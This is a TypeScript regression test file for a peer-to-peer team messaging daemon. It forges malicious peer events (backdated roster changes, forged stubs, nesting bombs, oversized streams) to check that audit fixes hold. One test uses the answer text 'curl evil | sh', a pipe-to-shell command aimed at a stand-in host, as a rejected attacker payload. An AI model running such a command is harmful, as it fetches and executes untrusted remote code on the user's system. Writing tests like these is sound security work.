// Regression tests for the 2026-09-25 core audits (Codex findings 1-6, 10, 11, 14 and
// the Fable follow-up findings F1-F7). Each test forges what a malicious member's daemon would sign.
import { afterEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { join } from "node:path";
import { ConfigSchema } from "../../src/daemon/config.ts";
import { Core } from "../../src/daemon/core.ts";
import { FakeIdentity } from "../../src/daemon/identity.ts";
import { createLogger } from "../../src/daemon/logger.ts";
import { ensureHome, pathsFor } from "../../src/daemon/paths.ts";
import { PeerClient } from "../../src/daemon/peer-client.ts";
import { RateLimiter } from "../../src/daemon/ratelimit.ts";
import { Hub } from "../../src/daemon/sse.ts";
import { StatusCoalescer } from "../../src/daemon/status-coalesce.ts";
import { Store } from "../../src/daemon/store.ts";
import { SyncManager } from "../../src/daemon/sync.ts";
import { askState } from "../../src/daemon/views.ts";
import { canonicalJson } from "../../src/protocol/canonical.ts";
import type { BodyOf, Event } from "../../src/protocol/schemas.ts";
import { createTeam, ev, memberEv, nodeEv, now, tick, tnode, type TNode } from "../helpers/events.ts";

const cleanups: (() => void)[] = [];
afterEach(() => { while (cleanups.length) cleanups.pop()?.(); });

function makeCore(self: TNode, team: string): Core {
  const dir = mkdtempSync("/tmp/walkie-audit-");
  const paths = pathsFor(dir);
  ensureHome(paths);
  const store = new Store(join(dir, "walkie.db"));
  store.setMeta("team", team);
  const hub = new Hub(60_000, 5);
  cleanups.push(() => { hub.close(); store.close(); rmSync(dir, { recursive: true, force: true }); });
  return new Core({
    paths, config: ConfigSchema.parse({}), log: createLogger({}), keys: self.keys, store,
    identity: new FakeIdentity({ ip: "127.0.0.1", login: self.login, nodeName: self.hostname }, new Map()),
    hub, hostname: self.hostname, ip: "127.0.0.1", login: self.login, peerPort: 7458, clock: now,
  });
}

/** A roster body carrying the authority's signed watermark `wm` (typed loosely so the test compiles against any schema). */
function withWm<T>(body: T, wm: Record<string, number>): T {
  return { ...body, wm } as T;
}

function header(e: Event): Record<string, unknown> {
  return { v: e.v, team: e.team, id: e.id, origin: e.origin, seq: e.seq, ts: e.ts, kind: e.kind, channel: e.channel };
}

function statusOf(core: Core, id: string): string {
  const row = core.store.getRow(id);
  if (!row) return "absent";
  if (row.redacted === 1) return "stub";
  return row.status;
}

function feed(core: Core, events: Event[]): void {
  for (const e of events) core.ingest(e, "remote");
}

// ---- D1: deterministic validity via signed watermarks (hestia 2, 4; Fable F1; FIX-3 anchoring) ----

describe("D1 watermarks (hestia #2, #4; Fable F1)", () => {
  // FIX-2: bea's roster events never count (she isn't the authority); her invite is gone from this
  // test, which now only checks that a removed owner's backdated event is rejected on every replica.
  test("a removed owner's backdated roster event after its removal is rejected on every replica", () => {
    const alex = tnode("alex"), bea = tnode("bea"), kira = tnode("kira"), mal = tnode("mal");
    const { team, create } = createTeam(alex);
    const promote = memberEv(team, alex, bea, "owner");
    const admit = nodeEv(team, alex, bea);
    const invite = ev(team, alex, "team.member", { login: kira.login, handle: "kira", role: "member", requested_by: "bea" });
    const inviteMal = memberEv(team, alex, mal, "member");
    const removal = ev(team, alex, "team.member", withWm({ login: bea.login, handle: "bea", role: "removed" as const }, { [bea.keys.nodeId]: 1 }));
    const forged = ev(team, bea, "team.member", { login: mal.login, handle: "mal", role: "owner" }, { ts: removal.ts - 5_000 });
    const setup = [create, promote, admit, invite, inviteMal];

    const fresh = makeCore(tnode("fresh"), team);
    feed(fresh, [...setup, removal, forged]);
    const early = makeCore(tnode("early"), team);
    feed(early, [...setup, forged, removal]); // the forgery arrives before the removal
    for (const core of [fresh, early]) {
      expect(core.roster.members.get(mal.login)?.role).toBe("member");
      expect(core.roster.members.get(kira.login)?.role).toBe("member"); // the invite before the removal stands
      expect(statusOf(core, forged.id)).toBe("rejected");
      expect(statusOf(core, invite.id)).toBe("ok");
    }
  });

  test("Fable F1: a demoted ex-owner can't remove the founder with a backdated team.member", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const setup = [create, memberEv(team, alex, kira, "owner"), nodeEv(team, alex, kira), ev(team, alex, "channel.upsert", { name: "general" })];
    const k1 = ev(team, kira, "msg.post", { text: "owner era" }, { channel: "general" });
    const demote = ev(team, alex, "team.member", withWm({ login: kira.login, handle: "kira", role: "member" as const }, { [kira.keys.nodeId]: 1 }));
    const forged = ev(team, kira, "team.member", { login: alex.login, handle: "alex", role: "removed" }, { ts: demote.ts - 1 });
    const core = makeCore(tnode("obs"), team); // alex's own node: see the integration test
    feed(core, [...setup, k1, demote]);
    expect(core.ingest(forged, "remote").status).not.toBe("accepted");
    expect(core.roster.members.get(alex.login)?.role).toBe("owner");
    expect(statusOf(core, k1.id)).toBe("ok");
  });

  test("hestia #4: the accepted set does not depend on arrival order", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const setup = [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira), ev(team, alex, "channel.upsert", { name: "general" })];
    const p1 = ev(team, kira, "msg.post", { text: "seen by alex" }, { channel: "general" });
    const removal = ev(team, alex, "team.member", withWm({ login: kira.login, handle: "kira", role: "removed" as const }, { [kira.keys.nodeId]: 1 }));
    const p2 = ev(team, kira, "msg.post", { text: "unseen by the authority" }, { channel: "general", ts: removal.ts - 10_000 });
    const a = makeCore(tnode("a"), team);
    feed(a, [...setup, p1, p2, removal]);
    const b = makeCore(tnode("b"), team);
    feed(b, [...setup, removal, p1, p2]);
    for (const core of [a, b]) {
      expect(statusOf(core, p1.id)).toBe("ok");
      expect(statusOf(core, p2.id)).toBe("rejected");
      expect(core.store.queryEvents({ channel: "general", limit: 10 }).map((r) => r.id)).toEqual([p1.id]);
    }
  });

  test("an accepted event that a later restriction invalidates is hidden everywhere it surfaced", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const core = makeCore(tnode("obs"), team);
    feed(core, [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira), ev(team, alex, "channel.upsert", { name: "general" })]);
    const hidden: string[] = [];
    const publishHidden = core.hub.publishHidden.bind(core.hub);
    core.hub.publishHidden = (ids) => { hidden.push(...ids); publishHidden(ids); };
    const s1 = ev(team, kira, "agent.status", { agent: "ux", state: "working", runtime: "cli", title: "first" }, { agent: "ux" });
    const s2 = ev(team, kira, "agent.status", { agent: "ux", state: "working", runtime: "cli", title: "second" }, { agent: "ux" });
    const ask = ev(team, kira, "ask", { to: "@alex", text: "q", expires_at: Date.now() + 60_000 }, { channel: "general" });
    feed(core, [s1, s2, ask]);
    expect(JSON.parse(core.store.agent(kira.keys.nodeId, "ux")?.body ?? "{}").title).toBe("second");
    // alex had seen only kira's seq 1 when making kira an observer
    feed(core, [ev(team, alex, "team.member", withWm({ login: kira.login, handle: "kira", role: "observer" as const }, { [kira.keys.nodeId]: 1 }))]);
    expect(statusOf(core, s2.id)).toBe("rejected");
    expect(JSON.parse(core.store.agent(kira.keys.nodeId, "ux")?.body ?? "{}").title).toBe("first");
    expect(core.store.asks().some((r) => r.id === ask.id)).toBe(false);
    expect(hidden).toEqual(expect.arrayContaining([s2.id, ask.id]));
  });

  // FIX-2: #design is created by the authority on kira's request (a member can't sign roster events).
  test("Fable F2: a revoked node's events the authority saw first are stored and valid", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const setup = [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira),
      ev(team, alex, "channel.upsert", { name: "design", requested_by: "kira" })];
    const design = ev(team, kira, "msg.post", { text: "kira in design" }, { channel: "design" });
    const post = ev(team, alex, "msg.post", { text: "design post" }, { channel: "design" });
    const revoke = ev(team, alex, "team.node", withWm({
      node_id: kira.keys.nodeId, login: kira.login, hostname: kira.hostname, pubkey: kira.keys.pubkey, ip: "127.0.0.1", revoked: true,
    }, { [kira.keys.nodeId]: 1 }));
    const late = makeCore(tnode("bob"), team);
    feed(late, [...setup, revoke]);
    expect(late.ingest(design, "remote").status).toBe("accepted"); // kira seq 1 anchors before the revocation (wm 1)
    expect(late.ingest(post, "remote").status).toBe("accepted");
    const after = ev(team, kira, "msg.post", { text: "after revocation" }, { channel: "design" });
    expect(late.ingest(after, "remote").status).toBe("rejected");
    expect(late.store.vvOf(kira.keys.nodeId)).toBe(2); // stored hidden: contiguity holds
  });
});

// ---- D2: channel ownership (hestia #1) ----------------------------------------------------------

describe("D2 channel ownership (hestia #1)", () => {
  test("a backdated channel.upsert by a member can't take over or open a restricted channel", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const setup = [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira)];
    const ops = ev(team, alex, "channel.upsert", { name: "ops", members: ["alex"] });
    const backdated = ev(team, kira, "channel.upsert", { name: "ops", topic: "mine" }, { ts: ops.ts - 500 });
    const openUp = ev(team, kira, "channel.upsert", { name: "ops" });
    const peek = ev(team, kira, "msg.post", { text: "in" }, { channel: "ops" });
    const core = makeCore(tnode("fresh"), team);
    feed(core, [...setup, ops, backdated, openUp, peek]);
    expect(core.roster.channels.get("ops")?.members).toEqual(["alex"]);
    expect(statusOf(core, openUp.id)).toBe("rejected");
    expect(statusOf(core, peek.id)).toBe("rejected");
  });

  // FIX-2: a member's channel.upsert is never a roster event; creation goes through a request to the
  // authority (see test/integration/audit-fix2.test.ts). Only the authority's upserts apply.
  test("only the authority's channel.upsert applies", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const core = makeCore(tnode("x"), team);
    feed(core, [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira)]);
    expect(core.ingest(ev(team, kira, "channel.upsert", { name: "kiras" }), "remote")).toEqual({ status: "rejected", reason: "not_authority" });
    expect(core.roster.channels.has("kiras")).toBe(false);
    expect(core.ingest(ev(team, alex, "channel.upsert", { name: "kiras", requested_by: "kira" }), "remote").status).toBe("accepted");
  });
});

// ---- D3: signed stub headers + self-origin guard (hestia #3; Fable F3) --------------------------

describe("D3 stubs (hestia #3; Fable F3)", () => {
  function world() {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const setup = [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira),
      ev(team, alex, "channel.upsert", { name: "secret", members: ["alex"] }), ev(team, alex, "channel.upsert", { name: "general" })];
    return { alex, kira, team, setup };
  }

  test("an unsigned stub is refused", () => {
    const { alex, kira, team, setup } = world();
    const core = makeCore(kira, team);
    feed(core, setup);
    const stub = { id: `${alex.keys.nodeId}:99`, origin: alex.keys.nodeId, seq: 99, redacted: true, channel: "secret" };
    expect(core.ingest(stub, "remote").status).toBe("rejected");
    expect(core.store.getRow(stub.id)).toBeNull();
  });

  test("a stub or event claiming this node's own origin never moves its seq allocation", () => {
    const { alex, kira, team, setup } = world();
    const core = makeCore(kira, team);
    feed(core, setup);
    const stub = { id: `${kira.keys.nodeId}:1000000`, origin: kira.keys.nodeId, seq: 1_000_000, redacted: true, channel: "secret" };
    expect(core.ingest(stub, "remote").status).toBe("rejected");
    // Even a genuinely signed copy of "our" event that we don't hold (lost DB, replay) is refused.
    const mine = { ...kira, seq: 49 };
    const own = ev(team, mine, "msg.post", { text: "from the past" }, { channel: "general" });
    expect(core.ingest(own, "remote").status).toBe("rejected");
    const next = core.emit("msg.post", { text: "next" }, { channel: "general" });
    expect(next.seq).toBe(1);
    void alex;
  });

  test("Fable F3: a relay can't swap a public event for a stub (header signature binds the channel)", () => {
    const { alex, kira, team, setup } = world();
    const core = makeCore(kira, team);
    feed(core, setup);
    const post = ev(team, alex, "msg.post", { text: "prod deploy cancelled" }, { channel: "general" });
    const lie = { ...header(post), channel: "secret" };
    const forgedStub = { id: post.id, origin: post.origin, seq: post.seq, channel: "secret", kind: post.kind, ts: post.ts,
      hsig: alex.keys.sign(canonicalJson(header(post))), redacted: true };
    expect(core.ingest(forgedStub, "remote").status).toBe("rejected");
    const reSigned = { ...forgedStub, hsig: kira.keys.sign(canonicalJson(lie)) };
    expect(core.ingest(reSigned, "remote").status).toBe("rejected");
    expect(core.ingest(post, "remote").status).toBe("accepted");
    expect(statusOf(core, post.id)).toBe("ok");
  });

  test("an origin-signed stub for a restricted channel the receiver can't see is stored", () => {
    const { alex, kira, team, setup } = world();
    const core = makeCore(kira, team);
    feed(core, setup);
    const secret = ev(team, alex, "msg.post", { text: "classified" }, { channel: "secret" });
    const stub = { id: secret.id, origin: secret.origin, seq: secret.seq, channel: "secret", kind: secret.kind, ts: secret.ts,
      hsig: alex.keys.sign(canonicalJson(header(secret))), redacted: true };
    expect(core.ingest(stub, "remote").status).toBe("accepted");
    expect(statusOf(core, secret.id)).toBe("stub");
  });
});

// ---- D6: answers (hestia #10; Fable F4) ----------------------------------------------------------

describe("D6 answers (hestia #10; Fable F4)", () => {
  function world() {
    const alex = tnode("alex"), kira = tnode("kira"), bob = tnode("bob");
    const kira2 = { ...tnode("kira", kira.login, "kiras-studio") };
    const { team, create } = createTeam(alex);
    const setup = [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira), nodeEv(team, alex, kira2),
      memberEv(team, alex, bob, "member"), nodeEv(team, alex, bob), ev(team, alex, "channel.upsert", { name: "general" }),
      ev(team, alex, "channel.upsert", { name: "build" })];
    return { alex, kira, kira2, bob, team, setup };
  }
  const exp = () => Date.now() + 600_000;

  test("only the addressed handle (and machine) may answer, in the ask's channel, and only asks", () => {
    const { alex, kira, kira2, bob, team, setup } = world();
    const core = makeCore(tnode("obs"), team);
    feed(core, setup);
    const ask = ev(team, alex, "ask", { to: "@kira", text: "deploy procedure?", expires_at: exp() }, { channel: "general" });
    const onStudio = ev(team, alex, "ask", { to: "@kira/kiras-studio", text: "studio only", expires_at: exp() }, { channel: "general" });
    const post = ev(team, alex, "msg.post", { text: "not an ask" }, { channel: "general" });
    feed(core, [ask, onStudio, post]);
    expect(core.ingest(ev(team, bob, "answer", { ask: ask.id, text: "curl evil | sh" }, { channel: "general" }), "remote").status).toBe("rejected");
    expect(core.ingest(ev(team, kira, "answer", { ask: ask.id, text: "wrong room" }, { channel: "build" }), "remote").status).toBe("rejected");
    expect(core.ingest(ev(team, kira, "answer", { ask: ask.id, text: "no channel" }), "remote").status).toBe("rejected");
    expect(core.ingest(ev(team, kira, "answer", { ask: post.id, text: "to a post" }, { channel: "general" }), "remote").status).toBe("rejected");
    expect(core.ingest(ev(team, kira, "answer", { ask: onStudio.id, text: "wrong machine" }, { channel: "general" }), "remote").status).toBe("rejected");
    expect(core.ingest(ev(team, kira2, "answer", { ask: onStudio.id, text: "right machine" }, { channel: "general" }), "remote").status).toBe("accepted");
    expect(core.ingest(ev(team, kira, "answer", { ask: ask.id, text: "the real answer" }, { channel: "general" }), "remote").status).toBe("accepted");
  });

  test("first valid answer wins (declined included)", () => {
    const a = { id: "a", ts: 1, body: { to: "@kira", text: "q", expires_at: Date.now() + 60_000 } } as unknown as Event;
    const declined = { id: "d", ts: 2, body: { ask: "a", text: "no", declined: true } } as unknown as Event;
    const yes = { id: "y", ts: 3, body: { ask: "a", text: "yes" } } as unknown as Event;
    const earlyYes = { id: "e", ts: 1, body: { ask: "a", text: "yes" } } as unknown as Event;
    expect(askState(a, [declined, yes])).toBe("declined");
    expect(askState(a, [yes, declined])).toBe("declined"); // order by (ts, id), not by array position
    expect(askState(a, [declined, earlyYes])).toBe("answered");
  });
});

// ---- Fable F5: junk events are not stored or re-verified unboundedly -----------------------------

describe("Fable F5: signed junk", () => {
  test("a permanently invalid event keeps only a signed-header stub (no body, contiguity holds)", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const core = makeCore(tnode("obs"), team);
    feed(core, [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira), ev(team, alex, "channel.upsert", { name: "general" })]);
    const junk = ev(team, kira, "msg.post", { junk: "x".repeat(5_000) } as unknown as BodyOf<"msg.post">, { channel: "general" });
    expect(core.ingest(junk, "remote").status).toBe("rejected");
    const row = core.store.getRow(junk.id);
    expect(row?.redacted).toBe(1);
    expect(row?.json).not.toContain("xxxxx");
    expect(core.store.vvOf(kira.keys.nodeId)).toBe(1);
  });

  test("hidden (curable) rows are capped per origin", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const core = makeCore(tnode("obs"), team);
    feed(core, [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira), ev(team, alex, "channel.upsert", { name: "secret", members: ["alex"] })]);
    for (let i = 0; i < 1_010; i++) core.ingest(ev(team, kira, "msg.post", { text: `knock ${i}` }, { channel: "secret" }), "remote");
    const hidden = core.store.db.query<{ n: number }, [string]>("SELECT COUNT(*) AS n FROM events WHERE origin = ? AND status = 'rejected'").get(kira.keys.nodeId)?.n;
    expect(hidden).toBeLessThanOrEqual(1_000);
    expect(core.store.vvOf(kira.keys.nodeId)).toBe(1_010);
  });
});

// ---- Fable F6: removal revokes the login's nodes -------------------------------------------------

describe("Fable F6: re-invite does not re-arm old nodes", () => {
  test("team.member removed revokes every node of that login; a re-invite alone doesn't restore them", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const core = makeCore(tnode("obs"), team);
    feed(core, [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira), ev(team, alex, "channel.upsert", { name: "general" })]);
    feed(core, [ev(team, alex, "team.member", withWm({ login: kira.login, handle: "kira", role: "removed" as const }, { [kira.keys.nodeId]: 0 }))]);
    feed(core, [memberEv(team, alex, kira, "member")]);
    expect(core.roster.nodes.get(kira.keys.nodeId)?.revoked).toBe(true);
    expect(core.ingest(ev(team, kira, "msg.post", { text: "old laptop is back" }, { channel: "general" }), "remote").status).toBe("rejected");
    feed(core, [nodeEv(team, alex, kira)]); // a fresh admission (walkie join) re-arms it
    expect(core.ingest(ev(team, kira, "msg.post", { text: "re-joined" }, { channel: "general" }), "remote").status).toBe("accepted");
  });
});

// ---- Fable F7: deep nesting ---------------------------------------------------------------------

describe("Fable F7: deep nesting", () => {
  test("a deeply nested body is rejected as bad_event without throwing", () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    const core = makeCore(tnode("obs"), team);
    feed(core, [create, memberEv(team, alex, kira, "member"), nodeEv(team, alex, kira), ev(team, alex, "channel.upsert", { name: "general" })]);
    let deep: unknown = [];
    for (let i = 0; i < 20_000; i++) deep = [deep];
    const e = { ...ev(team, kira, "msg.post", { text: "x" }, { channel: "general" }) };
    const bomb = { ...e, body: { text: "x", deep } };
    expect(core.ingest(bomb, "remote")).toEqual({ status: "rejected", reason: "bad_event" });
    let shallow: unknown = [];
    for (let i = 0; i < 40; i++) shallow = [shallow];
    expect(core.ingest({ ...e, body: { text: "x", shallow } }, "remote")).toEqual({ status: "rejected", reason: "bad_event" });
  });
});

// ---- D7: bounds (hestia #11) ----------------------------------------------------------------------

describe("D7 bounds (hestia #11)", () => {
  /** A peer that streams its body forever: only a client that caps while streaming ever returns. */
  function endlessServer(prefix: string): { port: number; stop: () => void } {
    const chunk = new TextEncoder().encode("x".repeat(64 * 1024));
    const server = Bun.serve({
      hostname: "127.0.0.1", port: 0,
      fetch: () => {
        let first = true;
        const stream = new ReadableStream<Uint8Array>({
          async pull(ctrl) {
            if (first) { first = false; ctrl.enqueue(new TextEncoder().encode(prefix)); return; }
            await Bun.sleep(1); // yield: client and server share this process's event loop
            ctrl.enqueue(chunk);
          },
        });
        return new Response(stream, { headers: { "Content-Type": "application/json" } });
      },
    });
    return { port: server.port as number, stop: () => server.stop(true) };
  }

  test("peer client rejects an oversized events response while streaming", async () => {
    const srv = endlessServer('{"events":[], "pad":"');
    cleanups.push(srv.stop);
    const client = new PeerClient({ team: () => "0123456789abcdef", nodeId: "0123456789abcdef" });
    await expect(client.pull({ ip: "127.0.0.1", port: srv.port }, "0123456789abcdef", 0)).rejects.toMatchObject({ code: "too_large" });
  }, 10_000);

  test("peer client rejects an oversized blob while streaming", async () => {
    const srv = endlessServer("");
    cleanups.push(srv.stop);
    const client = new PeerClient({ team: () => "0123456789abcdef", nodeId: "0123456789abcdef" });
    expect(await client.blob({ ip: "127.0.0.1", port: srv.port }, "a".repeat(64), "general", 25 * 1024 * 1024)).toBeNull();
  }, 20_000);

  test("peer client validates response shapes", async () => {
    const server = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: () => Response.json({ vv: "not-a-map" }) });
    cleanups.push(() => server.stop(true));
    const client = new PeerClient({ team: () => "0123456789abcdef", nodeId: "0123456789abcdef" });
    await expect(client.vv({ ip: "127.0.0.1", port: server.port as number })).rejects.toMatchObject({ code: "bad_response" });
  });

  test("a slow SSE client is dropped once its queue passes the cap", async () => {
    const hub = new Hub(60_000, 5);
    cleanups.push(() => hub.close());
    const ac = new AbortController();
    const res = hub.open(null, [], ac.signal);
    expect(res).not.toBeNull();
    expect(hub.size).toBe(1);
    const big = { id: "0123456789abcdef:1", kind: "msg.post", channel: "general", body: { text: "y".repeat(30_000) } } as unknown as Event;
    for (let i = 0; i < 100; i++) hub.publishEvent(big); // ~3 MB queued, never read
    expect(hub.size).toBe(0);
    ac.abort();
  });

  test("status coalescer and rate limiter maps are globally capped", () => {
    const co = new StatusCoalescer({ tryEmit: () => null }, 60_000);
    for (let i = 0; i < 700; i++) co.submit(`agent-${i}`, { agent: `agent-${i}`, state: "working", runtime: "cli" });
    const internals = co as unknown as { held: Map<string, unknown>; timers: Map<string, unknown> };
    expect(internals.held.size).toBeLessThanOrEqual(512);
    expect(internals.timers.size).toBeLessThanOrEqual(512);
    co.stop();
    const rl = new RateLimiter();
    for (let i = 0; i < 700; i++) rl.take(`status:agent-${i}`, { capacity: 2, perSecond: 2 });
    expect((rl as unknown as { buckets: Map<string, unknown> }).buckets.size).toBeLessThanOrEqual(512);
  });
});

// ---- D8: pushes recompute authorization at send time (hestia #14) --------------------------------

describe("D8 pushes (hestia #14)", () => {
  test("a queued push to a peer that lost channel access sends a stub", async () => {
    const alex = tnode("alex"), kira = tnode("kira");
    const { team, create } = createTeam(alex);
    alex.seq = 1;
    const core = makeCore(alex, team);
    core.ingest(create, "local");
    // alex's own events are emitted locally: a daemon never ingests its own origin from a peer
    core.emit("team.member", { login: kira.login, handle: "kira", role: "member" });
    core.emit("team.node", { node_id: kira.keys.nodeId, login: kira.login, hostname: kira.hostname, pubkey: kira.keys.pubkey, ip: "127.0.0.1" });
    core.emit("channel.upsert", { name: "war-room", members: ["alex", "kira"] });
    const sent: unknown[] = [];
    let release: () => void = () => undefined;
    const gate = new Promise<void>((r) => { release = r; });
    let first = true;
    const fake = {
      addrOf: (n: { ip: string; port: number }) => ({ ip: n.ip, port: n.port }), // v0.2: sync asks the client where a node is
      push: async (_addr: unknown, events: unknown[]) => {
        if (first) { first = false; await gate; }
        sent.push(events[0]);
        return { accepted: 1, pending: 0, rejected: [] };
      },
    } as unknown as PeerClient;
    const sync = new SyncManager(core, fake, { intervalMs: 3_600_000 });
    const opener = core.emit("msg.post", { text: "opener" }, { channel: "war-room" });
    sync.push(opener); // blocks in flight
    const secret = core.emit("msg.post", { text: "the plan" }, { channel: "war-room" });
    sync.push(secret); // queued behind it
    core.emit("channel.upsert", { name: "war-room", members: ["alex"] }); // kira loses access
    release();
    await Bun.sleep(50);
    const payload = sent.find((p) => (p as { id: string }).id === secret.id) as Record<string, unknown> | undefined;
    expect(payload).toBeDefined();
    expect(payload?.redacted).toBe(true);
    expect(JSON.stringify(payload)).not.toContain("the plan");
    sync.stop();
  });
});

void tick;
